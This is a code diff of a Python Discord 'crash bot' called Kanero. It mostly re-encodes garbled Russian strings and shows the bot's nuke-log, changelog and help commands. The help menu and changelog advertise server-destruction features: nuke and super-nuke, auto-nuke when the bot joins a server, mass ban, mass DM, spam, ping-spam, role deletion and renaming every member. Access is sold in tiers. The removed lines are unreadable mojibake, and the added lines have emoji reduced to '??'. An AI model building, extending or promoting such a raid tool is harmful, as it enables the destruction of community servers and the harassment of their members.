+        await ctx.send("? Нет прав выдать эту роль (роль выше бота в иерархии).")
     except Exception as e:
-        await ctx.send(f"вќЊ РћС€РёР±РєР°: {e}")
+        await ctx.send(f"? Ошибка: {e}")
 
 
 @bot.command(name="roles")
 async def roles_cmd(ctx):
-    """РџРѕРєР°Р·Р°С‚СЊ СЂРѕР»Рё РєРѕС‚РѕСЂС‹Рµ Р±РѕС‚ РјРѕР¶РµС‚ РІС‹РґР°РІР°С‚СЊ (РЅРёР¶Рµ РµРіРѕ СЂРѕР»Рё РІ РёРµСЂР°СЂС…РёРё)."""
+    """Показать роли которые бот может выдавать (ниже его роли в иерархии)."""
     if ctx.author.id != config.OWNER_ID:
         return
     bot_role = ctx.guild.me.top_role
     available = [r for r in ctx.guild.roles if r < bot_role and not r.is_default()]
     if not available:
-        await ctx.send("РќРµС‚ СЂРѕР»РµР№ РєРѕС‚РѕСЂС‹Рµ Р±РѕС‚ РјРѕР¶РµС‚ РІС‹РґР°С‚СЊ.")
+        await ctx.send("Нет ролей которые бот может выдать.")
         return
     available.sort(key=lambda r: r.position, reverse=True)
-    lines = [f"`{r.id}` вЂ” **{r.name}**" for r in available[:30]]
+    lines = [f"`{r.id}` — **{r.name}**" for r in available[:30]]
     embed = discord.Embed(
-        title=f"рџЋ­ Р РѕР»Рё РґРѕСЃС‚СѓРїРЅС‹Рµ Р±РѕС‚Сѓ ({len(available)})",
+        title=f"?? Роли доступные боту ({len(available)})",
         description="\n".join(lines),
         color=0x0a0a0a
     )
-    embed.set_footer(text=f"в пёЏ Kanero  |  Р РѕР»СЊ Р±РѕС‚Р°: {bot_role.name}  |  !giverole @СЋР·РµСЂ @СЂРѕР»СЊ")
+    embed.set_footer(text=f"?? Kanero  |  Роль бота: {bot_role.name}  |  !giverole @юзер @роль")
     await ctx.send(embed=embed)
 
 
 @bot.command(name="nukelogs")
 async def nukelogs(ctx):
-    """РџРѕРєР°Р·Р°С‚СЊ Р»РѕРіРё РЅСЋРєРѕРІ. РўРѕР»СЊРєРѕ РґР»СЏ РѕРІРЅРµСЂР°."""
+    """Показать логи нюков. Только для овнера."""
     if ctx.author.id != config.OWNER_ID:
         return
     db = get_db()
     if db is None:
-        await ctx.send("вќЊ MongoDB РЅРµ РїРѕРґРєР»СЋС‡РµРЅР°.")
+        await ctx.send("? MongoDB не подключена.")
         return
     cursor = db["nuke_logs"].find({})
     logs = await cursor.to_list(length=100)
     if not logs:
-        await ctx.send("Р›РѕРіРѕРІ РЅСЋРєРѕРІ РЅРµС‚.")
+        await ctx.send("Логов нюков нет.")
         return
-    embed = discord.Embed(title="рџ“‹ Р›РѕРіРё РЅСЋРєРѕРІ", color=0x0a0a0a)
-    # Р­РјРѕРґР·Рё РґР»СЏ СЂР°Р·РЅС‹С… С‚РёРїРѕРІ РЅСЋРєРѕРІ
+    embed = discord.Embed(title="?? Логи нюков", color=0x0a0a0a)
+    # Эмодзи для разных типов нюков
     type_emojis = {
-        "nuke": "рџ’Ђ",
-        "super_nuke": "в пёЏ",
-        "owner_nuke": "рџ‘‘",
-        "auto_nuke": "рџ¤–",
-        "auto_super_nuke": "рџ¤–в пёЏ",
-        "auto_superpr_nuke": "рџ¤–вљЎ",
-        "auto_owner_nuke": "рџ¤–рџ‘‘"
+        "nuke": "??",
+        "super_nuke": "??",
+        "owner_nuke": "??",
+        "auto_nuke": "??",
+        "auto_super_nuke": "????",
+        "auto_superpr_nuke": "???",
+        "auto_owner_nuke": "????"
     }
-    for doc in logs[:20]:  # РјР°РєСЃРёРјСѓРј 20 РІ РѕРґРЅРѕРј embed
+    for doc in logs[:20]:  # максимум 20 в одном embed
         entry = doc.get("value", doc)
         nuke_type = entry.get('type', '?')
-        emoji = type_emojis.get(nuke_type, 'вљЎ')
-        invite = entry.get("invite") or "РЅРµС‚ РёРЅРІР°Р№С‚Р°"
+        emoji = type_emojis.get(nuke_type, '?')
+        invite = entry.get("invite") or "нет инвайта"
         embed.add_field(
             name=f"{emoji} {entry.get('guild_name', '?')}",
             value=(
-                f"РўРёРї: `{nuke_type}`\n"
-                f"РљС‚Рѕ: **{entry.get('user_name', '?')}** (`{entry.get('user_id', '?')}`)\n"
-                f"Р’СЂРµРјСЏ: `{entry.get('time', '?')}`\n"
-                f"РРЅРІР°Р№С‚: {invite}"
+                f"Тип: `{nuke_type}`\n"
+                f"Кто: **{entry.get('user_name', '?')}** (`{entry.get('user_id', '?')}`)\n"
+                f"Время: `{entry.get('time', '?')}`\n"
+                f"Инвайт: {invite}"
             ),
             inline=False
         )
-    embed.set_footer(text=f"в пёЏ Kanero  |  Р’СЃРµРіРѕ Р·Р°РїРёСЃРµР№: {len(logs)}")
+    embed.set_footer(text=f"?? Kanero  |  Всего записей: {len(logs)}")
     await ctx.send(embed=embed)
 
 
@@ -4366,109 +4366,109 @@ bot.remove_command("help")
 
 @bot.command(name="changelog")
 async def changelog(ctx):
-    """РџРѕРєР°Р·С‹РІР°РµС‚ С‚РѕР»СЊРєРѕ РїРѕСЃР»РµРґРЅРµРµ РѕР±РЅРѕРІР»РµРЅРёРµ."""
-    embed = discord.Embed(title="рџ“‹ CHANGELOG вЂ” v2.4  |  РќРѕРІС‹Р№ С‚РµРєСЃС‚, СЃРєРѕСЂРѕСЃС‚СЊ, INFO", color=0x0a0a0a)
+    """Показывает только последнее обновление."""
+    embed = discord.Embed(title="?? CHANGELOG — v2.4  |  Новый текст, скорость, INFO", color=0x0a0a0a)
     embed.add_field(
-        name="рџ”Ґ v2.4",
+        name="?? v2.4",
         value=(
-            "**вњЁ РќРѕРІРѕРµ:**\n"
-            "вЂў РџРѕР»РЅРѕСЃС‚СЊСЋ РїРµСЂРµСЂР°Р±РѕС‚Р°РЅ С‚РµРєСЃС‚ РЅСЋРєР° вЂ” СЃС‚РёР»СЊРЅС‹Р№ РґРёР·Р°Р№РЅ СЃ СЂР°РјРєР°РјРё\n"
-            "вЂў РљР°С‚РµРіРѕСЂРёСЏ INFO СЃ РєР°РЅР°Р»Р°РјРё #info Рё #changelog\n"
-            "вЂў `!setup_update` РїРµСЂРµРЅРѕСЃРёС‚ #changelog РІ INFO Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРё\n\n"
-            "**вљЎ РЎРєРѕСЂРѕСЃС‚СЊ:**\n"
-            "вЂў `guild.chunk()` РїРµСЂРµРґ РЅСЋРєРѕРј вЂ” РјРіРЅРѕРІРµРЅРЅР°СЏ Р·Р°РіСЂСѓР·РєР° СѓС‡Р°СЃС‚РЅРёРєРѕРІ\n"
-            "вЂў РђРІС‚Рѕ-РЅСЋРєРё СЂР°Р±РѕС‚Р°СЋС‚ РјР°РєСЃРёРјР°Р»СЊРЅРѕ Р±С‹СЃС‚СЂРѕ\n"
-            "вЂў РџРѕРІС‚РѕСЂРЅР°СЏ РїРѕРїС‹С‚РєР° СѓРґР°Р»РµРЅРёСЏ СЂРѕР»РµР№\n\n"
-            "**рџ—‘пёЏ РЈРґР°Р»РµРЅРѕ:**\n"
-            "вЂў РљРѕРјР°РЅРґС‹ `!owner_nuke` Рё `!auto_owner_nuke`\n"
-            "вЂў РЎРїРёСЃРѕРє OWNER_NUKE_LIST\n\n"
-            "**рџђ› РСЃРїСЂР°РІР»РµРЅРѕ:**\n"
-            "вЂў Р’СЂРµРјРµРЅРЅС‹Рµ РїРѕРґРїРёСЃРєРё С‚РµРїРµСЂСЊ РІ РѕС‚РґРµР»СЊРЅРѕР№ СЃРµРєС†РёРё (РЅР°Рґ Freelist)\n"
-            "вЂў РЎСЃС‹Р»РєРё РІ СЃРѕРѕР±С‰РµРЅРёСЏС… РѕР±РЅРѕРІР»СЏСЋС‚СЃСЏ С‡РµСЂРµР· `!setup_update`"
+            "**? Новое:**\n"
+            "• Полностью переработан текст нюка — стильный дизайн с рамками\n"
+            "• Категория INFO с каналами #info и #changelog\n"
+            "• `!setup_update` переносит #changelog в INFO автоматически\n\n"
+            "**? Скорость:**\n"
+            "• `guild.chunk()` перед нюком — мгновенная загрузка участников\n"
+            "• Авто-нюки работают максимально быстро\n"
+            "• Повторная попытка удаления ролей\n\n"
+            "**??? Удалено:**\n"
+            "• Команды `!owner_nuke` и `!auto_owner_nuke`\n"
+            "• Список OWNER_NUKE_LIST\n\n"
+            "**?? Исправлено:**\n"
+            "• Временные подписки теперь в отдельной секции (над Freelist)\n"
+            "• Ссылки в сообщениях обновляются через `!setup_update`"
         ),
         inline=False
     )
-    embed.set_footer(text="в пёЏ Kanero  |  discord.gg/aud6wwYVRd  |  !changelogall вЂ” РІСЃСЏ РёСЃС‚РѕСЂРёСЏ")
+    embed.set_footer(text="?? Kanero  |  discord.gg/aud6wwYVRd  |  !changelogall — вся история")
     embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
     await ctx.send(embed=embed)
 
 
 @bot.command(name="changelogall")
 async def changelogall(ctx):
-    """РџРѕРєР°Р·С‹РІР°РµС‚ РІСЃСЋ РёСЃС‚РѕСЂРёСЋ РѕР±РЅРѕРІР»РµРЅРёР№."""
-    embed = discord.Embed(title="рџ“‹ CHANGELOG вЂ” РџРѕР»РЅР°СЏ РёСЃС‚РѕСЂРёСЏ  |  v1.0 в†’ v2.0", color=0x0a0a0a)
-    embed.add_field(name="в пёЏ v1.0", value="вЂў `!nuke`, `!stop`, `!webhooks`, Р»РѕРіРёСЂРѕРІР°РЅРёРµ", inline=False)
-    embed.add_field(name="вљЎ v1.1", value="вЂў `!auto_nuke`, `/sp`, `/spkd`, whitelist, `!cleanup`, `!rename`", inline=False)
-    embed.add_field(name="рџЋЁ v1.2", value="вЂў РўС‘РјРЅС‹Р№ СЃС‚РёР»СЊ, Owner Panel, `!owl_add`, `!invlink`", inline=False)
-    embed.add_field(name="рџ†• v1.3", value="вЂў Premium СЃРёСЃС‚РµРјР°, `!block_guild`, `!set_spam_text`", inline=False)
-    embed.add_field(name="рџ†• v1.4", value="вЂў `!massdm`, `!massban`, `!spam`, `!pingspam`, `!rolesdelete`, `!serverinfo`", inline=False)
-    embed.add_field(name="рџ’Ђ v1.5-1.6", value="вЂў `!super_nuke`, `!auto_super_nuke`, `!auto_superpr_nuke`", inline=False)
-    embed.add_field(name="рџ”Ґ v1.7", value="вЂў MongoDB, `!pm_add` Р°РІС‚Рѕ +whitelist, `!list`, `!list_clear`", inline=False)
-    embed.add_field(name="рџ”Ґ v1.8", value="вЂў Freelist, `!owner_nuke`, `!auto_off`, `!setup`, `!nukelogs`, `!fl_add/remove/list/clear`", inline=False)
+    """Показывает всю историю обновлений."""
+    embed = discord.Embed(title="?? CHANGELOG — Полная история  |  v1.0 > v2.0", color=0x0a0a0a)
+    embed.add_field(name="?? v1.0", value="• `!nuke`, `!stop`, `!webhooks`, логирование", inline=False)
+    embed.add_field(name="? v1.1", value="• `!auto_nuke`, `/sp`, `/spkd`, whitelist, `!cleanup`, `!rename`", inline=False)
+    embed.add_field(name="?? v1.2", value="• Тёмный стиль, Owner Panel, `!owl_add`, `!invlink`", inline=False)
+    embed.add_field(name="?? v1.3", value="• Premium система, `!block_guild`, `!set_spam_text`", inline=False)
+    embed.add_field(name="?? v1.4", value="• `!massdm`, `!massban`, `!spam`, `!pingspam`, `!rolesdelete`, `!serverinfo`", inline=False)
+    embed.add_field(name="?? v1.5-1.6", value="• `!super_nuke`, `!auto_super_nuke`, `!auto_superpr_nuke`", inline=False)
+    embed.add_field(name="?? v1.7", value="• MongoDB, `!pm_add` авто +whitelist, `!list`, `!list_clear`", inline=False)
+    embed.add_field(name="?? v1.8", value="• Freelist, `!owner_nuke`, `!auto_off`, `!setup`, `!nukelogs`, `!fl_add/remove/list/clear`", inline=False)
     embed.add_field(
-        name="рџ”Ґрџ”Ґ v2.0 вЂ” РџРћР›РќР«Р™ Р Р•Р”РР—РђР™Рќ",
+        name="???? v2.0 — ПОЛНЫЙ РЕДИЗАЙН",
         value=(
-            "вЂў РљР°С‚РµРіРѕСЂРёРё: РЎРўРђРўРРЎРўРРљРђ В· FREELIST В· WHITE В· PREMIUM\n"
-            "вЂў РЎС‡С‘С‚С‡РёРєРё СЂРѕР»РµР№, С‚РёРєРµС‚С‹, СЂРѕР»Рё User/Media/Moderator\n"
-            "вЂў !wl_add/pm_add/fl_add РїРѕ username/@mention/ID\n"
-            "вЂў !setup_update вЂ” РѕР±РЅРѕРІРёС‚СЊ Р±РµР· СѓРґР°Р»РµРЅРёСЏ РєР°РЅР°Р»РѕРІ\n"
-            "вЂў !list_clear вЂ” РѕС‡РёС‰Р°РµС‚ РІСЃРµ СЃРїРёСЃРєРё\n"
-            "вЂў ADMIN вЂ” РІСЃРµ РІРёРґСЏС‚, С‚РѕР»СЊРєРѕ Owner РїРёС€РµС‚\n"
-            "вЂў РЎС‚Р°С‚РёСЃС‚РёРєР° РѕР±РЅРѕРІР»СЏРµС‚СЃСЏ Р°РІС‚Рѕ"
+            "• Категории: СТАТИСТИКА · FREELIST · WHITE · PREMIUM\n"
+            "• Счётчики ролей, тикеты, роли User/Media/Moderator\n"
+            "• !wl_add/pm_add/fl_add по username/@mention/ID\n"
+            "• !setup_update — обновить без удаления каналов\n"
+            "• !list_clear — очищает все списки\n"
+            "• ADMIN — все видят, только Owner пишет\n"
+            "• Статистика обновляется авто"
         ),
         inline=False
     )
     embed.add_field(
-        name="рџ”Ґ v2.1 вЂ” РќРѕРІС‹Рµ С„СѓРЅРєС†РёРё",
+        name="?? v2.1 — Новые функции",
         value=(
-            "вЂў рџ¤ќ Friend, рџЋ¬ Media, рџ›ЎпёЏ Moderator вЂ” РїСЂР°РІРёР»СЊРЅР°СЏ РёРµСЂР°СЂС…РёСЏ\n"
-            "вЂў РђРІС‚Рѕ-СЂРѕР»СЊ рџ‘¤ Guest РїСЂРё РІС…РѕРґРµ\n"
-            "вЂў рџ›’гѓ»sell В· рџЋ«гѓ»РІС‹РґР°С‡Р°-РІР°Р№С‚Р°\n"
-            "вЂў !sync_roles вЂ” СЃРёРЅС…СЂРѕРЅРёР·Р°С†РёСЏ СЂРѕР»РµР№ + Р°РІС‚Рѕ-СѓРґР°Р»РµРЅРёРµ РёР· Р»РёСЃС‚Р°\n"
-            "вЂў !autorole вЂ” СЃС‚Р°С‚СѓСЃ Р°РІС‚Рѕ-СЂРѕР»Рё\n"
-            "вЂў Р›РЎ РєРѕРјР°РЅРґС‹ СЃСЂР°Р·Сѓ РЅР° РґРѕРјР°С€РЅРµРј СЃРµСЂРІРµСЂРµ"
+            "• ?? Friend, ?? Media, ??? Moderator — правильная иерархия\n"
+            "• Авто-роль ?? Guest при входе\n"
+            "• ???sell · ???выдача-вайта\n"
+            "• !sync_roles — синхронизация ролей + авто-удаление из листа\n"
+            "• !autorole — статус авто-роли\n"
+            "• ЛС команды сразу на домашнем сервере"
         ),
         inline=False
     )
     embed.add_field(
-        name="рџ”Ґ v2.2",
+        name="?? v2.2",
         value=(
-            "вЂў рџЊџ Fame в†’ рџ¤ќ Friend, СЃС‚РѕРёС‚ РЅР°Рґ рџ’Ћ Premium\n"
-            "вЂў рџ¤ќгѓ»admin-chat РІ ADMIN\n"
-            "вЂў РќСЋРєРё Р±С‹СЃС‚СЂРµРµ вЂ” СѓРґР°Р»РµРЅРёРµ Рё СЃРѕР·РґР°РЅРёРµ РїР°СЂР°Р»Р»РµР»СЊРЅРѕ\n"
-            "вЂў РћРІРЅРµСЂ РІСЃРµРіРґР° РѕСЃС‚Р°РЅР°РІР»РёРІР°РµС‚ Р»СЋР±РѕР№ РЅСЋРє\n"
-            "вЂў РђРІС‚Рѕ-Р»РѕРі РІ рџ“Љгѓ»logs РїСЂРё РєР°Р¶РґРѕРј РЅСЋРєРµ\n"
-            "вЂў РЈРґР°Р»РµРЅС‹ `/sp` Рё `/spkd`"
+            "• ?? Fame > ?? Friend, стоит над ?? Premium\n"
+            "• ???admin-chat в ADMIN\n"
+            "• Нюки быстрее — удаление и создание параллельно\n"
+            "• Овнер всегда останавливает любой нюк\n"
+            "• Авто-лог в ???logs при каждом нюке\n"
+            "• Удалены `/sp` и `/spkd`"
         ),
         inline=False
     )
     embed.add_field(
-        name="рџђ› v2.3 вЂ” Р‘Р°РіС„РёРєСЃС‹",
+        name="?? v2.3 — Багфиксы",
         value=(
-            "вЂў РСЃРїСЂР°РІР»РµРЅ РєСЂРёС‚РёС‡РµСЃРєРёР№ Р±Р°Рі СЃ Р°РІС‚РѕРєСЂР°С€РµРј РґРѕРјР°С€РЅРµРіРѕ СЃРµСЂРІРµСЂР°\n"
-            "вЂў Р—Р°С‰РёС‚Р° РѕС‚ Р°РІС‚Рѕ-РЅСЋРєРѕРІ РЅР° РґРѕРјР°С€РЅРµРј СЃРµСЂРІРµСЂРµ\n"
-            "вЂў Р›РѕРіРёСЂРѕРІР°РЅРёРµ РІСЃРµС… С‚РёРїРѕРІ РЅСЋРєРѕРІ (auto_nuke, auto_super_nuke, auto_owner_nuke)\n"
-            "вЂў РўРѕРєРµРЅ Рё OWNER_ID РІ РїРµСЂРµРјРµРЅРЅС‹С… РѕРєСЂСѓР¶РµРЅРёСЏ\n"
-            "вЂў `!help` Рё `!changelog` СЂР°Р±РѕС‚Р°СЋС‚ РґР»СЏ РІСЃРµС… РЅР° РЅР°С€РµРј СЃРµСЂРІРµСЂРµ\n"
-            "вЂў `!setup` Рё `!setup_update` Р°РІС‚РѕРјР°С‚РёС‡РµСЃРєРё РІС‹РґР°СЋС‚ СЂРѕР»СЊ рџ‘¤ Guest\n"
-            "вЂў `!compensate` вЂ” СЃРёСЃС‚РµРјР° РєРѕРјРїРµРЅСЃР°С†РёР№ Р·Р° РЅР°Р№РґРµРЅРЅС‹Рµ Р±Р°РіРё"
+            "• Исправлен критический баг с автокрашем домашнего сервера\n"
+            "• Защита от авто-нюков на домашнем сервере\n"
+            "• Логирование всех типов нюков (auto_nuke, auto_super_nuke, auto_owner_nuke)\n"
+            "• Токен и OWNER_ID в переменных окружения\n"
+            "• `!help` и `!changelog` работают для всех на нашем сервере\n"
+            "• `!setup` и `!setup_update` автоматически выдают роль ?? Guest\n"
+            "• `!compensate` — система компенсаций за найденные баги"
         ),
         inline=False
     )
     embed.add_field(
-        name="рџ”Ґ v2.4 вЂ” РўРµРєСЃС‚, СЃРєРѕСЂРѕСЃС‚СЊ, INFO",
+        name="?? v2.4 — Текст, скорость, INFO",
         value=(
-            "вЂў РќРѕРІС‹Р№ СЃС‚РёР»СЊРЅС‹Р№ С‚РµРєСЃС‚ РЅСЋРєР° СЃ СЂР°РјРєР°РјРё Рё СЂР°Р·РґРµР»РёС‚РµР»СЏРјРё\n"
-            "вЂў РљР°С‚РµРіРѕСЂРёСЏ INFO СЃ #info Рё #changelog\n"
-            "вЂў `guild.chunk()` вЂ” РјРіРЅРѕРІРµРЅРЅР°СЏ Р·Р°РіСЂСѓР·РєР° СѓС‡Р°СЃС‚РЅРёРєРѕРІ\n"
-            "вЂў РђРІС‚Рѕ-РЅСЋРєРё СЂР°Р±РѕС‚Р°СЋС‚ РјР°РєСЃРёРјР°Р»СЊРЅРѕ Р±С‹СЃС‚СЂРѕ\n"
-            "вЂў РЈРґР°Р»РµРЅС‹ `!owner_nuke` Рё `!auto_owner_nuke`\n"
-            "вЂў Р’СЂРµРјРµРЅРЅС‹Рµ РїРѕРґРїРёСЃРєРё РІ РѕС‚РґРµР»СЊРЅРѕР№ СЃРµРєС†РёРё\n"
-            "вЂў `!setup_update` РїРµСЂРµРЅРѕСЃРёС‚ #changelog РІ INFO"
+            "• Новый стильный текст нюка с рамками и разделителями\n"
+            "• Категория INFO с #info и #changelog\n"
+            "• `guild.chunk()` — мгновенная загрузка участников\n"
+            "• Авто-нюки работают максимально быстро\n"
+            "• Удалены `!owner_nuke` и `!auto_owner_nuke`\n"
+            "• Временные подписки в отдельной секции\n"
+            "• `!setup_update` переносит #changelog в INFO"
         ),
         inline=False
     )
-    embed.set_footer(text="в пёЏ Kanero  |  discord.gg/aud6wwYVRd  |  С‚РµРєСѓС‰Р°СЏ РІРµСЂСЃРёСЏ: v2.3")
+    embed.set_footer(text="?? Kanero  |  discord.gg/aud6wwYVRd  |  текущая версия: v2.3")
     embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
     await ctx.send(embed=embed)
 
@@ -4482,118 +4482,118 @@ async def help_cmd(ctx):
     is_fl = is_freelisted(uid)
 
     embed = discord.Embed(
-        title="в пёЏ Kanero вЂ” CRASH BOT",
+        title="?? Kanero — CRASH BOT",
         description=(
             "```\n"
-            "  в–€в–€в–€в–€в–€в–€в•—в–€в–€в–€в–€в–€в–€в•—  в–€в–€в–€в–€в–€в•— в–€в–€в–€в–€в–€в–€в–€в•—в–€в–€в•—  в–€в–€в•—\n"
-            " в–€в–€в•”в•ђв•ђв•ђв•ђв•ќв–€в–€в•”в•ђв•ђв–€в–€в•—в–€в–€в•”в•ђв•ђв–€в–€в•—в–€в–€в•”в•ђв•ђв•ђв•ђв•ќв–€в–€в•‘  в–€в–€в•‘\n"
-            " в–€в–€в•‘     в–€в–€в–€в–€в–€в–€в•”в•ќв–€в–€в–€в–€в–€в–€в–€в•‘в–€в–€в–€в–€в–€в–€в–€в•—в–€в–€в–€в–€в–€в–€в–€в•‘\n"
-            " в–€в–€в•‘     в–€в–€в•”в•ђв•ђв–€в–€в•—в–€в–€в•”в•ђв•ђв–€в–€в•‘в•љв•ђв•ђв•ђв•ђв–€в–€в•‘в–€в–€в•”в•ђв•ђв–€в–€в•‘\n"
-            " в•љв–€в–€в–€в–€в–€в–€в•—в–€в–€в•‘  в–€в–€в•‘в–€в–€в•‘  в–€в–€в•‘в–€в–€в–€в–€в–€в–€в–€в•‘в–€в–€в•‘  в–€в–€в•‘\n"
-            "  в•љв•ђв•ђв•ђв•ђв•ђв•ќв•љв•ђв•ќ  в•љв•ђв•ќв•љв•ђв•ќ  в•љв•ђв•ќв•љв•ђв•ђв•ђв•ђв•ђв•ђв•ќв•љв•ђв•ќ  в•љв•ђв•ќ\n"
+            "  ------¬------¬  -----¬ -------¬--¬  --¬\n"
+            " --г====---г==--¬--г==--¬--г====---¦  --¦\n"
+            " --¦     ------г--------¦-------¬-------¦\n"
+            " --¦     --г==--¬--г==--¦L====--¦--г==--¦\n"
+            " L------¬--¦  --¦--¦  --¦-------¦--¦  --¦\n"
+            "  L=====-L=-  L=-L=-  L=-L======-L=-  L=-\n"
             "```"
         ),
         color=0x0a0a0a
     )
 
     if is_owner:
-        access_str = "рџ‘‘ **OWNER** вЂ” РїРѕР»РЅС‹Р№ РґРѕСЃС‚СѓРї"
+        access_str = "?? **OWNER** — полный доступ"
     elif is_prem:
-        access_str = "рџ’Ћ **PREMIUM** вЂ” СЂР°СЃС€РёСЂРµРЅРЅС‹Р№ РґРѕСЃС‚СѓРї"
+        access_str = "?? **PREMIUM** — расширенный доступ"
     elif is_wl:
-        access_str = "вњ… **Whitelist** вЂ” Р±Р°Р·РѕРІС‹Рµ РєРѕРјР°РЅРґС‹"
+        access_str = "? **Whitelist** — базовые команды"
     elif is_freelisted(uid):
-        access_str = "рџ“‹ **Freelist** вЂ” Р±Р°Р·РѕРІС‹Р№ РґРѕСЃС‚СѓРї (РЅР°РїРёСЃР°Р» РІ #addbot)"
+        access_str = "?? **Freelist** — базовый доступ (написал в #addbot)"
     else:
-        access_str = "вќЊ **РќРµС‚ РґРѕСЃС‚СѓРїР°** вЂ” РЅР°РїРёС€Рё РІ #addbot РЅР° РЅР°С€РµРј СЃРµСЂРІРµСЂРµ: https://discord.gg/aud6wwYVRd"
+        access_str = "? **Нет доступа** — напиши в #addbot на нашем сервере: https://discord.gg/nNTB37QNCG"
 
-    embed.add_field(name="рџ”‘ РўРІРѕР№ СѓСЂРѕРІРµРЅСЊ", value=access_str, inline=False)
+    embed.add_field(name="?? Твой уровень", value=access_str, inline=False)
 
     embed.add_field(
-        name="рџ“‹ FREELIST (РЅР°РїРёС€Рё РІ #addbot вЂ” Р±РµСЃРїР»Р°С‚РЅРѕ)",
+        name="?? FREELIST (напиши в #addbot — бесплатно)",
         value=(
-            "`!nuke` вЂ” РєСЂР°С€ (РїРµСЂРµРёРјРµРЅРѕРІР°РЅРёРµ в†’ СЂРѕР»Рё в†’ РєР°РЅР°Р»С‹ в†’ СЃРїР°Рј в†’ СЂРѕР»СЊ в пёЏ)\n"
-            "`!auto_nuke on/off/info` вЂ” Р°РІС‚Рѕ-РєСЂР°С€ РїСЂРё РІС…РѕРґРµ Р±РѕС‚Р°\n"
-            "`!help` вЂ” СЌС‚Рѕ РјРµРЅСЋ\n"
-            "`!changelog` вЂ” РїРѕСЃР»РµРґРЅРµРµ РѕР±РЅРѕРІР»РµРЅРёРµ\n"
-            "`!changelogall` вЂ” РІСЃСЏ РёСЃС‚РѕСЂРёСЏ"
+            "`!nuke` — краш (переименование > роли > каналы > спам > роль ??)\n"
+            "`!auto_nuke on/off/info` — авто-краш при входе бота\n"
+            "`!help` — это меню\n"
+            "`!changelog` — последнее обновление\n"
+            "`!changelogall` — вся история"
         ),
         inline=False
     )
 
     embed.add_field(
-        name="вњ… WHITELIST",
+        name="? WHITELIST",
         value=(
-            "`!nuke [С‚РµРєСЃС‚]` вЂ” РЅСЋРє СЃРѕ СЃРІРѕРёРј С‚РµРєСЃС‚РѕРј\n"
-            "`!stop` вЂ” РѕСЃС‚Р°РЅРѕРІРёС‚СЊ РєСЂР°С€\n"
-            "`!cleanup` вЂ” СЃРЅРµСЃС‚Рё РІСЃС‘, РѕСЃС‚Р°РІРёС‚СЊ РѕРґРёРЅ РєР°РЅР°Р»\n"
-            "`!rename [РЅР°Р·РІР°РЅРёРµ]` вЂ” РїРµСЂРµРёРјРµРЅРѕРІР°С‚СЊ РєР°РЅР°Р»С‹\n"
-            "`!nicks_all [РЅРёРє]` вЂ” СЃРјРµРЅРёС‚СЊ РЅРёРєРё РІСЃРµРј\n"
-            "`!webhooks` вЂ” СЃРїРёСЃРѕРє РІРµР±С…СѓРєРѕРІ\n"
-            "`!inv` вЂ” СЃСЃС‹Р»РєР° РґР»СЏ РґРѕР±Р°РІР»РµРЅРёСЏ Р±РѕС‚Р°"
+            "`!nuke [текст]` — нюк со своим текстом\n"
+            "`!stop` — остановить краш\n"
+            "`!cleanup` — снести всё, оставить один канал\n"
+            "`!rename [название]` — переименовать каналы\n"
+            "`!nicks_all [ник]` — сменить ники всем\n"
+            "`!webhooks` — список вебхуков\n"
+            "`!inv` — ссылка для добавления бота"
         ),
         inline=False
     )
 
     embed.add_field(
-        name="рџ’Ћ PREMIUM",
+        name="?? PREMIUM",
         value=(
-            "`!nuke [С‚РµРєСЃС‚]` вЂ” РЅСЋРє СЃ РєР°СЃС‚РѕРјРЅС‹Рј С‚РµРєСЃС‚РѕРј\n"
-            "`!super_nuke [С‚РµРєСЃС‚]` вЂ” РЅСЋРє, РґРѕ 15 СѓС‡Р°СЃС‚РЅРёРєРѕРІ + СЂРѕР»СЊ в пёЏ\n"
-            "`!auto_super_nuke on/off/text/info` вЂ” Р°РІС‚Рѕ super_nuke РїСЂРё РІС…РѕРґРµ\n"
-            "`!auto_superpr_nuke on/off/text/info` вЂ” Р°РІС‚Рѕ С‚СѓСЂР±Рѕ РЅСЋРє РїСЂРё РІС…РѕРґРµ\n"
-            "`!massban` В· `!massdm` В· `!spam` В· `!pingspam`\n"
-            "`!rolesdelete` В· `!serverinfo` В· `!userinfo`"
+            "`!nuke [текст]` — нюк с кастомным текстом\n"
+            "`!super_nuke [текст]` — нюк, до 15 участников + роль ??\n"
+            "`!auto_super_nuke on/off/text/info` — авто super_nuke при входе\n"
+            "`!auto_superpr_nuke on/off/text/info` — авто турбо нюк при входе\n"
+            "`!massban` · `!massdm` · `!spam` · `!pingspam`\n"
+            "`!rolesdelete` · `!serverinfo` · `!userinfo`"
         ),
         inline=False
     )
 
     embed.add_field(
-        name="рџ§Є TESTER",
+        name="?? TESTER",
         value=(
-            "РЎРїРµС†РёР°Р»СЊРЅС‹Р№ РґРѕСЃС‚СѓРї РґР»СЏ С‚РµСЃС‚РёСЂРѕРІР°РЅРёСЏ РЅРѕРІС‹С… С„СѓРЅРєС†РёР№\n"
-            "РџСЂР°РІР° Premium + РґРѕСЃС‚СѓРї Рє РєР°С‚РµРіРѕСЂРёРё TESTS\n"
-            "РљР°РЅР°Р»С‹: рџђ›гѓ»bug-reports В· рџ§Єгѓ»testing В· вњ…гѓ»test-results"
+            "Специальный доступ для тестирования новых функций\n"
+            "Права Premium + доступ к категории TESTS\n"
+            "Каналы: ???bug-reports · ???testing · ??test-results"
         ),
         inline=False
     )
 
     if is_owner:
         embed.add_field(
-            name="рџ‘‘ OWNER",
+            name="?? OWNER",
             value=(
-                "`!owner_nuke [С‚РµРєСЃС‚]` вЂ” РїРѕР»РЅС‹Р№ РЅСЋРє + СЂРѕР»СЊ в пёЏ\n"
-                "`!auto_owner_nuke on/off/text/info` вЂ” Р°РІС‚Рѕ owner РЅСЋРє\n"
-                "`!auto_off` вЂ” РІС‹РєР»СЋС‡РёС‚СЊ РІСЃРµ Р°РІС‚Рѕ РЅСЋРєРё\n"
-                "`!auto_info` вЂ” СЃС‚Р°С‚СѓСЃ РІСЃРµС… Р°РІС‚Рѕ РЅСЋРєРѕРІ\n"
-                "`!wl_add/remove/list` В· `!pm_add/remove/list`\n"
-                "`!fl_add/remove/list/clear` вЂ” freelist\n"
-                "`!tester_add/remove/list` вЂ” СѓРїСЂР°РІР»РµРЅРёРµ С‚РµСЃС‚РµСЂР°РјРё\n"
-                "`!on_add/remove/list` вЂ” owner nuke list\n"
